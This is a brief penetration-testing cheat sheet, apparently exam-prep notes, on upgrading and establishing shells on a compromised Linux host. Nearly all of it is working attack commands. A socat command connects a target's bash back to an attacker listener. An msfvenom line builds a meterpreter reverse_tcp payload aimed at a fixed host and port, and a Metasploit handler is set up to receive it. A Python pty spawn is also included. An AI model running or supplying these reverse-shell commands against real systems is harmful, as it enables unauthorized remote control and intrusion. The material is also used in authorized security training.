# Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

# Socat

Static binary:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

On attacker:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:7777
```

On target:
```bash
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:7777
```

# Meterpreter

NOT OSCP!

Upgrade a system shell to meterpreter:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.22 LPORT=7777 -f elf > revshell.bin
```

Setup listener: 
```msfconsole
use exploit/multi/handler
```